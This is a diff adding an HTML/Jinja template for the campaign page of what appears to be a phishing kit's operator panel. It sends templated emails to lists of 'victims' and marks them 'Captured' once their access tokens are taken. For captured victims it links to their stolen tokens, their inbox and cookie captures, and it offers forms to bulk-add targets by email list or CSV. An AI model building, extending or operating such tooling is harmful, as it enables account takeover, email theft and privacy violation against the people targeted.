@@ -1,0 +1,518 @@
+{% extends "base.html" %}
+{% block title %}Campaign Details{% endblock %}
+{% block page_title %}📧 {{ campaign.name }}{% endblock %}
+
+{% block extra_head %}
+<style>
+    .campaign-stats {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+        gap: 16px;
+        margin-bottom: 24px;
+    }
+    .stat-item {
+        background: var(--card-bg);
+        padding: 16px 20px;
+        border-radius: 12px;
+        border: 1px solid var(--border);
+        text-align: center;
+    }
+    .stat-item .number {
+        font-size: 28px;
+        font-weight: 700;
+    }
+    .stat-item .label {
+        font-size: 13px;
+        color: var(--text-muted);
+        margin-top: 4px;
+    }
+    .stat-item .sub {
+        font-size: 12px;
+        color: var(--text-muted);
+        margin-top: 2px;
+    }
+    .stat-item.blue .number { color: var(--primary); }
+    .stat-item.green .number { color: var(--success); }
+    .stat-item.orange .number { color: var(--warning); }
+    .stat-item.red .number { color: var(--danger); }
+    .stat-item.purple .number { color: #9b59b6; }
+
+    .campaign-actions {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        align-items: center;
+        margin: 16px 0;
+    }
+    .campaign-actions .badge-status {
+        padding: 6px 16px;
+        border-radius: 20px;
+        font-size: 13px;
+        font-weight: 600;
+    }
+    .badge-status.active { background: rgba(46,204,113,0.15); color: #27ae60; }
+    .badge-status.paused { background: rgba(243,156,18,0.15); color: #f39c12; }
+    .badge-status.cancelled { background: rgba(231,76,60,0.15); color: #e74c3c; }
+    .badge-status.completed { background: rgba(52,152,219,0.15); color: #2980b9; }
+
+    .btn-group-campaign {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px;
+    }
+    .btn-group-campaign .btn {
+        padding: 6px 14px;
+        font-size: 13px;
+    }
+    .btn-group-campaign .btn i { margin-right: 4px; }
+
+    .table-wrap {
+        overflow-x: auto;
+        margin-top: 16px;
+    }
+    .table-wrap table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: 14px;
+    }
+    .table-wrap th {
+        text-align: left;
+        padding: 10px 12px;
+        border-bottom: 2px solid var(--border);
+        font-weight: 600;
+        color: var(--text-muted);
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+    }
+    .table-wrap td {
+        padding: 10px 12px;
+        border-bottom: 1px solid var(--border);
+        vertical-align: middle;
+    }
+    .table-wrap tr:hover td {
+        background: rgba(0,0,0,0.02);
+    }
+
+    .avatar-sm {
+        width: 28px;
+        height: 28px;
+        border-radius: 50%;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 11px;
+        font-weight: 600;
+        color: #fff;
+        margin-right: 8px;
+        flex-shrink: 0;
+    }
+
+    .badge {
+        display: inline-block;
+        padding: 2px 12px;
+        border-radius: 12px;
+        font-size: 12px;
+        font-weight: 600;
+    }
+    .badge-success { background: rgba(46,204,113,0.15); color: #27ae60; }
+    .badge-warning { background: rgba(243,156,18,0.15); color: #f39c12; }
+    .badge-danger { background: rgba(231,76,60,0.15); color: #e74c3c; }
+    .badge-info { background: rgba(52,152,219,0.15); color: #2980b9; }
+
+    .btn-sm {
+        padding: 4px 10px;
+        font-size: 12px;
+        border-radius: 6px;
+    }
+    .btn-sm i { margin-right: 0; }
+
+    .add-victims-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+        margin-top: 12px;
+    }
+    .add-victims-grid textarea {
+        width: 100%;
+        min-height: 120px;
+        padding: 10px;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        background: var(--input-bg);
+        color: var(--text-primary);
+        font-family: monospace;
+        font-size: 13px;
+        resize: vertical;
+    }
+    .add-victims-grid .file-upload {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        justify-content: center;
+    }
+    .add-victims-grid .file-upload input[type="file"] {
+        padding: 10px;
+        border: 1px dashed var(--border);
+        border-radius: 8px;
+        background: var(--input-bg);
+        color: var(--text-primary);
+    }
+
+    @media (max-width: 768px) {
+        .add-victims-grid {
+            grid-template-columns: 1fr;
+        }
+        .campaign-actions {
+            flex-direction: column;
+            align-items: stretch;
+        }
+        .campaign-actions .btn-group-campaign {
+            justify-content: center;
+        }
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+
+<!-- ============================================================
+PROGRESS BAR
+============================================================ -->
+<div class="glass" id="progressCard" style="display:none; margin-bottom: 24px;">
+    <h3>📤 Sending Emails</h3>
+    <div style="margin: 16px 0;">
+        <div style="background: var(--border); border-radius: 8px; overflow: hidden; height: 24px; position: relative;">
+            <div id="progressFill" style="width:0%; height:100%; background: var(--primary); transition: width 0.5s;"></div>
+            <span id="progressText" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:14px; font-weight:600; color:#fff; text-shadow:0 1px 2px rgba(0,0,0,0.3);">0%</span>
+        </div>
+        <p id="progressStatus" style="margin-top:8px; color:var(--text-muted);">Preparing...</p>
+    </div>
+</div>
+
+<!-- ============================================================
+STATS
+============================================================ -->
+<div class="campaign-stats">
+    <div class="stat-item blue">
+        <div class="number">{{ total or 0 }}</div>
+        <div class="label">📬 Total Recipients</div>
+    </div>
+    <div class="stat-item green">
+        <div class="number">{{ captured or 0 }}</div>
+        <div class="label">✅ Captured</div>
+        <div class="sub">{{ ((captured / (total or 1)) * 100) | round(1) }}% rate</div>
+    </div>
+    <div class="stat-item orange">
+        <div class="number">{{ pending or 0 }}</div>
+        <div class="label">⏳ Pending</div>
+    </div>
+    <div class="stat-item purple">
+        <div class="number">{{ ((captured / (total or 1)) * 100) | round(1) }}%</div>
+        <div class="label">📈 Capture Rate</div>
+    </div>
+</div>
+
+<!-- ============================================================
+CAMPAIGN ACTIONS
+============================================================ -->
+<div class="glass" style="margin-bottom: 24px;">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px;">
+        <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
+            <h2 style="margin:0;">📊 {{ campaign.name }}</h2>
+            <span class="badge-status {{ campaign.status or 'active' }}">
+                {{ (campaign.status or 'active') | upper }}
+            </span>
+        </div>
+        <div class="campaign-actions" style="margin:0;">
+            <!-- Send Emails -->
+            {% if campaign.status != 'cancelled' and campaign.status != 'completed' %}
+            <form style="display:inline-flex; gap: 6px; align-items:center; flex-wrap:wrap;">
+                <select name="template_id" id="sendTemplate" style="padding: 6px 12px; border-radius:6px; border:1px solid var(--border); background: var(--input-bg); color: var(--text-primary); font-size:13px;">
+                    <option value="">📄 Random Template</option>
+                    {% for t in templates %}
+                    <option value="{{ t.id }}">{{ t.name }}</option>
+                    {% endfor %}
+                </select>
+                <button type="button" class="btn btn-success" onclick="sendEmails()" id="sendBtn">
+                    <i class="fas fa-paper-plane"></i> Send
+                </button>
+            </form>
+            {% endif %}
+
+            <!-- Pause -->
+            {% if campaign.status == 'active' %}
+            <form action="/campaign/{{ campaign.id }}/pause" method="POST" style="display:inline;">
+                <button type="submit" class="btn btn-warning"><i class="fas fa-pause"></i> Pause</button>
+            </form>
+            {% endif %}
+
+            <!-- Resume (for paused OR cancelled) -->
+            {% if campaign.status == 'paused' or campaign.status == 'cancelled' %}
+            <form action="/campaign/{{ campaign.id }}/resume" method="POST" style="display:inline;">
+                <button type="submit" class="btn btn-success"><i class="fas fa-play"></i> Resume</button>
+            </form>
+            {% endif %}
+
+            <!-- Cancel (only for active or paused) -->
+            {% if campaign.status != 'cancelled' and campaign.status != 'completed' %}
+            <form action="/campaign/{{ campaign.id }}/cancel" method="POST" style="display:inline;">
+                <button type="submit" class="btn btn-danger" onclick="return confirm('Cancel this campaign? You can resume it later.')">
+                    <i class="fas fa-stop"></i> Cancel
+                </button>
+            </form>
+            {% endif %}
+
+            <a href="/campaign/{{ campaign.id }}/settings" class="btn btn-outline"><i class="fas fa-cog"></i></a>
+            <form action="/campaign/{{ campaign.id }}/delete" method="POST" style="display:inline;">
+                <button type="submit" class="btn btn-danger" onclick="return confirm('Delete this campaign?')"><i class="fas fa-trash"></i></button>
+            </form>
+            <a href="/admin" class="btn btn-outline"><i class="fas fa-arrow-left"></i></a>
+        </div>
+    </div>
+</div>
+
+<!-- ============================================================
+VICTIMS TABLE
+============================================================ -->
+<div class="glass">
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; margin-bottom: 12px;">
+        <h3 style="margin:0;">👤 Recipients</h3>
+        <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+            <span style="font-size:13px; color:var(--text-muted);">
+                {{ victims|length }} total
+            </span>
+        </div>
+    </div>
+
+    <div class="table-wrap">
+        <table>
+<thead>
+    <tr>
+        <th>Email</th>
+        <th>Name</th>
+        <th>Company</th>
+        <th>Code</th>
+        <th>Status</th>
+        <th>Link</th>
+        <th>Actions</th>
+    </tr>
+</thead>
+<tbody>
+    {% for v in victims %}
+    <tr>
+        <td>
+            <span class="avatar-sm" style="background: hsl({{ (v.id * 137) % 360 }}, 70%, 50%);">
+                {{ v.email[:1].upper() }}
+            </span>
+            {{ v.email }}
+        </td>
+        <td>{{ v.first_name or '—' }} {{ v.last_name or '' }}</td>
+        <td>{{ v.company or '—' }}</td>
+        <td><code style="font-size:12px; background:var(--input-bg); padding:2px 8px; border-radius:4px;">{{ v.code or '—' }}</code></td>
+        <td>
+            {% if v.access_token %}
+            <span class="badge badge-success">✅ Captured</span>
+            {% else %}
+            <span class="badge badge-warning">⏳ Waiting</span>
+            {% endif %}
+        </td>
+        <td>
+            <a href="/c/{{ v.token }}" target="_blank" title="Open victim link">
+                <i class="fas fa-link"></i>
+            </a>
+        </td>
+        <td style="white-space: nowrap;">
+            {% if v.access_token %}
+            <a href="/victim/{{ v.id }}/tokens" class="btn btn-sm btn-outline" title="Tokens"><i class="fas fa-key"></i></a>
+            <a href="/victim/{{ v.id }}/inbox" class="btn btn-sm btn-success" title="Inbox"><i class="fas fa-envelope"></i></a>
+            <a href="/victim/{{ v.id }}/captures" class="btn btn-sm btn-info" title="Captures"><i class="fas fa-cookie-bite"></i></a>
+            {% endif %}
+            <form action="/victim/{{ v.id }}/delete" method="POST" style="display:inline;">
+                <button type="submit" class="btn btn-sm btn-danger" onclick="return confirm('Delete this recipient?')" title="Delete"><i class="fas fa-user-minus"></i></button>
+            </form>
+        </td>
+    </tr>
+    {% endfor %}
+</tbody>
+        </table>
+    </div>
+</div>
+
+<!-- ============================================================
+ADD VICTIMS
+============================================================ -->
+<div class="glass">
+    <h3><i class="fas fa-plus-circle"></i> Add More Victims</h3>
+    <form action="/campaign/{{ campaign.id }}/add_emails" method="POST" enctype="multipart/form-data">
+        <div class="add-victims-grid">
+            <div>
+                <label style="font-weight:500; font-size:14px;">📝 Paste emails</label>
+                <textarea name="emails" rows="5" placeholder="victim1@domain.com&#10;victim2@domain.com"></textarea>
+            </div>
+            <div class="file-upload">
+                <label style="font-weight:500; font-size:14px;">📂 Or upload CSV</label>
+                <input type="file" name="csv_file" accept=".csv">
+                <small style="color: var(--text-muted);">CSV format: email, first_name, last_name, company</small>
+                <button type="submit" class="btn btn-primary" style="align-self:flex-start;">
+                    <i class="fas fa-user-plus"></i> Add Victims
+                </button>
+            </div>
+        </div>
+    </form>
+</div>
+
+<!-- ============================================================
+JAVASCRIPT
+============================================================ -->
+<script>
+function setProgress(ringId, percent) {
+    const ring = document.getElementById(ringId);
+    if (!ring) return;
+    const circle = ring.querySelector('.progress');
+    const radius = circle.r.baseVal.value;
+    const circumference = 2 * Math.PI * radius;
+    const offset = circumference - (percent / 100) * circumference;
+    circle.style.strokeDasharray = circumference;
+    circle.style.strokeDashoffset = circumference;
+    requestAnimationFrame(() => {
+        circle.style.strokeDashoffset = offset;
+    });
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    const total = {{ total or 0 }};
+    const captured = {{ captured or 0 }};
+    const percent = total > 0 ? (captured / total * 100) : 0;
+    setProgress('campaignRing', percent);
+});
+
+function sendEmails() {
+    const btn = document.getElementById('sendBtn');
+    const progressCard = document.getElementById('progressCard');
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const progressStatus = document.getElementById('progressStatus');
+    const templateId = document.getElementById('sendTemplate').value;
+
+    btn.disabled = true;
+    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+    progressCard.style.display = 'block';
+    progressFill.style.width = '0%';
+    progressText.textContent = '0%';
+    progressStatus.textContent = 'Starting...';
+
+    fetch('/campaign/14/send_async', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'template_id=' + encodeURIComponent(templateId)
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Server returned ' + response.status);
+        }
+        return response.text();
+    })
+    .then(text => {
+        console.log('Raw response:', text);
+        try {
+            const data = JSON.parse(text);
+            console.log('Parsed data:', data);
+            if (data.job_id) {
+                progressStatus.textContent = 'Sending...';
+                pollProgress(data.job_id);
+            } else if (data.error) {
+                progressStatus.textContent = 'Error: ' + data.error;
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            } else {
+                progressStatus.textContent = 'Error: No job ID returned.';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            }
+        } catch (e) {
+            console.error('JSON parse error:', e);
+            progressStatus.textContent = 'Error: Invalid response from server';
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+        }
+    })
+    .catch(error => {
+        console.error('Error starting send:', error);
+        progressStatus.textContent = 'Error: ' + error.message;
+        btn.disabled = false;
+        btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+    });
+}
+
+
+function pollProgress(jobId) {
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    const progressStatus = document.getElementById('progressStatus');
+    const btn = document.getElementById('sendBtn');
+
+    const interval = setInterval(() => {
+        fetch('/send_progress/' + jobId)
+        .then(response => response.json())
+        .then(data => {
+            if (data.error) {
+                clearInterval(interval);
+                progressStatus.textContent = 'Error: ' + data.error;
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+                return;
+            }
+            const total = data.total || 0;
+            const sent = data.sent || 0;
+            const failed = data.failed || 0;
+            const percent = total > 0 ? Math.round((sent / total) * 100) : 0;
+            progressFill.style.width = percent + '%';
+            progressText.textContent = percent + '%';
+            progressStatus.textContent = `Sent ${sent} of ${total} (${failed} failed)`;
+
+            if (data.status === 'completed') {
+                clearInterval(interval);
+                progressStatus.textContent = `✅ Complete! Sent ${sent} of ${total} (${failed} failed)`;
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            } else if (data.status === 'no_victims') {
+                clearInterval(interval);
+                progressStatus.textContent = 'No pending victims.';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            } else if (data.status === 'no_templates') {
+                clearInterval(interval);
+                progressStatus.textContent = 'No email templates found. Please create a template.';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            } else if (data.status.startsWith('smtp_error')) {
+                clearInterval(interval);
+                progressStatus.textContent = 'SMTP Error: ' + data.status.replace('smtp_error: ', '');
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            } else if (data.status === 'paused') {
+                clearInterval(interval);
+                progressStatus.textContent = '⏸️ Campaign is paused. Resume to continue sending.';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            } else if (data.status === 'cancelled') {
+                clearInterval(interval);
+                progressStatus.textContent = '⏹️ Campaign is cancelled.';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+            }
+        })
+        .catch(error => {
+            clearInterval(interval);
+            progressStatus.textContent = 'Polling error: ' + error;
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Emails';
+        });
+    }, 1000);
+}
+</script>
+
+{% endblock %}
